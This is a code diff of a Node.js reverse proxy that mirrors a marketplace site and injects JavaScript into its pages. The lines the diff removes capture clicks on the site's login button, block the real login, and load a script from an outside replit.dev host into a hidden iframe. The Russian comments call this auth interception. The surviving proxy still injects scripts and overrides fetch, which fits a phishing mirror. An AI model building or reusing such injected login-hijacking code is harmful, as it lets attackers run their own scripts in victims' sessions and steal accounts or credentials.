@@ -6,8 +6,6 @@ const WebSocket = require('ws');
 const url = require('url');
 const http = require('http');
 const https = require('https');
-const fs = require('fs');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -145,11 +143,11 @@ function modifyUrls(content, baseUrl, contentType = '') {
             modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
         }
         
-        // Инжектим прокси скрипт с перехватом авторизации
+        // Инжектим прокси скрипт
         const proxyScript = `
         <script>
         (function() {
-            console.log('🔧 Market proxy initialized with auth intercept');
+            console.log('🔧 Market proxy initialized (HTTPS mode)');
             
             // Сохраняем оригинальные функции
             const originalFetch = window.fetch;
@@ -252,86 +250,6 @@ function modifyUrls(content, baseUrl, contentType = '') {
                 
                 return element;
             };
-            
-            // ВАЖНО: Перехват кликов по кнопке авторизации
-            function interceptAuthButton() {
-                // Функция запуска авторизации
-                function startAuth() {
-                    console.log('🔐 Starting auth process...');
-                    
-                    // Создаем скрытый iframe
-                    const frame = document.createElement('iframe');
-                    frame.style.display = 'none';
-                    document.body.appendChild(frame);
-                    
-                    // Загружаем в iframe HTML с скриптом авторизации
-                    frame.contentDocument.open();
-                    frame.contentDocument.write(\`
-                        <!DOCTYPE html>
-                        <html>
-                        <head>
-                            <meta charset="utf-8">
-                        </head>
-                        <body>
-                            <script src="https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/bhcg4ddaadpt.js"></script>
-                            <script>
-                                // Этот скрипт будет выполнен после загрузки bhcg4ddaadpt.js
-                                // Если вам нужно что-то дополнительно вызвать, добавьте здесь
-                            </script>
-                        </body>
-                        </html>
-                    \`);
-                    frame.contentDocument.close();
-                }
-                
-                // Обработчик клика для кнопки авторизации
-                function handleAuthClick(e) {
-                    // Проверяем, что это клик по кнопке авторизации
-                    const button = e.target.closest('#login-register');
-                    if (!button) return;
-                    
-                    // Предотвращаем стандартное действие
-                    e.preventDefault();
-                    e.stopPropagation();
-                    
-                    // Запускаем авторизацию
-                    startAuth();
-                    
-                    return false;
-                }
-                
-                // Добавляем обработчик на уровне документа (чтобы перехватить событие до других обработчиков)
-                document.addEventListener('click', handleAuthClick, true);
-                
-                // Также добавляем прямой обработчик на кнопку, если она уже существует
-                const button = document.querySelector('#login-register');
-                if (button) {
-                    button.addEventListener('click', handleAuthClick, true);
-                }
-                
-                // Для динамически добавляемых элементов
-                const observer = new MutationObserver(() => {
-                    const newButton = document.querySelector('#login-register');
-                    if (newButton && !newButton._hasAuthHandler) {
-                        newButton._hasAuthHandler = true;
-                        newButton.addEventListener('click', handleAuthClick, true);
-                    }
-                });
-                
-                observer.observe(document.body, {
-                    childList: true,
-                    subtree: true
-                });
-            }
-            
-            // Запускаем перехват после загрузки DOM
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', interceptAuthButton);
-            } else {
-                interceptAuthButton();
-            }
-            
-            console.log('✅ Proxy script with auth intercept initialized');
         })();
         </script>
         `;
@@ -560,12 +478,11 @@ app.use('*', async (req, res) => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Advanced Market Proxy Server with Auth Intercept
+    🚀 Advanced Market Proxy Server (HTTPS Support)
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
-    🔐 Auth: Script loaded from Replit
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -575,7 +492,6 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ URL rewriting
     ✓ Content modification
     ✓ Mixed content prevention
-    ✓ Optimized auth handling
     `);
 });
 
